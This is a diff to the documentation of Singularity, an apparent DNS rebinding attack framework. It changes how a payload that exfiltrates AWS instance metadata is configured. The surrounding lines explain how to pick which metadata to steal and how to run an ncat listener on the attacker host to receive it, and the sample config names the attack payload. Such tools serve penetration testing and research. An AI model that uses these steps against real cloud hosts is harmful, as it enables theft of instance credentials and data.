@@ -9,8 +9,8 @@ Change `AWS_METADATA_PATH` as appropriate to exfiltrate the desired data e.g. `/
 Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the attacker host to capture the exfiltrated data.
 Use TLS if you want to protect the exfiltrated data in transit.
 
-Run the Singularity server using the `DNSRebindFromQueryMultiA` DNS rebinding strategy e.g
-`./singularity-server -DNSRebindStrategy DNSRebindFromQueryMultiA -HTTPServerPort 80`
+Run the Singularity server e.g
+`./singularity-server -HTTPServerPort 80`
 
 Ensure that `manager-config.json` contains this payload only,
 and any other relevant information. Sample configuration:
@@ -22,6 +22,7 @@ and any other relevant information. Sample configuration:
     "dummyPort": 4000,
     "interval": 1,
     "indexToken": "thisismytesttoken",
+    "rebindingStrategy": "FromQueryMultiA",
     "attackPayloads": [{
         "name": "payload-aws-metadata.html",
         "ports": [80]
